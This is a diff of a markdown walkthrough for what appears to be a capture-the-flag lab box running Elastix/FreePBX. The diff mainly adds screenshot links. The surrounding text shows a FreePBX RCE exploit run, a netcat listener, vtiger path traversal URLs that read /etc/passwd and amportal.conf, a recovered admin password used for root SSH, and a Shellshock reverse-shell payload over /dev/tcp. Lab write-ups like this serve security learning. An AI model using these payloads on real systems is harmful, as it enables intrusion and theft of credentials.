@@ -139,9 +139,12 @@ python3 setup.py install
 sipvicious_svmap -h
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-
+![b6](https://user-images.githubusercontent.com/15195048/93913797-71b49c80-fcba-11ea-95aa-adda4375aba7.png)
+ 
 ## 1 Exploit  FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution, asterisk user: 
 **python 18650.py**
+
+![b7](https://user-images.githubusercontent.com/15195048/93913798-724d3300-fcba-11ea-9505-d127e73943fc.png)
 
 
 Error: ssl certificate. After searching in google:
@@ -149,7 +152,7 @@ If you just want to bypass verification, you can create a new SSLContext. By def
 
 **Modifications:**
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-import urllib2
+import urllib2 
 import ssl
 
 ctx = ssl.create_default_context()
@@ -185,33 +188,42 @@ proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 r = requests.get(url, proxies=proxies, verify=False)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
+ 
+![b8](https://user-images.githubusercontent.com/15195048/93913800-724d3300-fcba-11ea-8c0d-853340f10f89.png)
 
 
 **Burp Suite**
+
+![b9](https://user-images.githubusercontent.com/15195048/93913801-72e5c980-fcba-11ea-8ac0-88796e622bbb.png)
 
 
 **Attacker:**
 nc -lvp 8888
 
+![b10](https://user-images.githubusercontent.com/15195048/93913802-72e5c980-fcba-11ea-9224-37d00e37f853.png)
 
 
 ## 2 Second Exploit, asterisk user: 
 Dirb results showed the following url path:
 https://10.10.10.7/vtigercrm/
 
+![b11](https://user-images.githubusercontent.com/15195048/93913805-737e6000-fcba-11ea-9076-b865abd26132.png)
 
 
-**vtiger CRM 5.1.0**
+**searchsploi vtiger CRM 5.1.0**
 
+![b12](https://user-images.githubusercontent.com/15195048/93913806-7416f680-fcba-11ea-8781-05c8addb5d55.png)
 
 
 ## Path Traversal
 URL: https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
 
+![b13](https://user-images.githubusercontent.com/15195048/93913810-7416f680-fcba-11ea-85cc-3187efb806ee.png)
+
 
 URL: https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
 
+![b14](https://user-images.githubusercontent.com/15195048/93913812-75482380-fcba-11ea-940e-13e25f7fd168.png)
 
 
 **Credentials:**
@@ -219,6 +231,7 @@ admin:jEhdIekWmdjE
 
 **ssh root@10.10.10.7 -oKexAlgorithms=diffie-hellman-group1-sha1**
 
+![b15](https://user-images.githubusercontent.com/15195048/93913814-75482380-fcba-11ea-82d0-7f1f69697eee.png)
 
 ## 3. Enumerating port 10000
 
@@ -226,13 +239,14 @@ Webmin is a web-based interface for system administration for Unix. Using any mo
   
 **searchsploit webmin**
   
+![b16](https://user-images.githubusercontent.com/15195048/93913816-75e0ba00-fcba-11ea-9830-a1da431d0c07.png)
+
 ## Shellshock explanation
 
 
+![b17](https://user-images.githubusercontent.com/15195048/93913818-76795080-fcba-11ea-9c26-5fdf7760b519.png)
 
-
-
-
+![b18](https://user-images.githubusercontent.com/15195048/93913820-76795080-fcba-11ea-9488-60c4b41c7ad1.png)
 
 
 **In the url session_login.cgi**
@@ -241,8 +255,12 @@ Webmin is a web-based interface for system administration for Unix. Using any mo
 
 **Burp Suite**
 
+![b19](https://user-images.githubusercontent.com/15195048/93913822-7711e700-fcba-11ea-8f00-fb299a5fc0d6.png)
+
 
 **() { :; }; bash -i &> /dev/tcp/10.10.14.12/9980 0>&1**
+
+![b20](https://user-images.githubusercontent.com/15195048/93913826-77aa7d80-fcba-11ea-837a-168752d63b36.png)
 
 
 ## 4. Enumerating port 25 SMTP 
@@ -250,6 +268,8 @@ Webmin is a web-based interface for system administration for Unix. Using any mo
 I will send a malicious e-mail and got a reverse shell.
 
 **telnet 10.10.10.7 25 it works so.**
+
+![b21](https://user-images.githubusercontent.com/15195048/93913829-77aa7d80-fcba-11ea-991e-8b347c66b627.png)
 
 **Keywords:** “EHLO Host”, “VRFY user” “mail from:” "rcpt tp:"
 
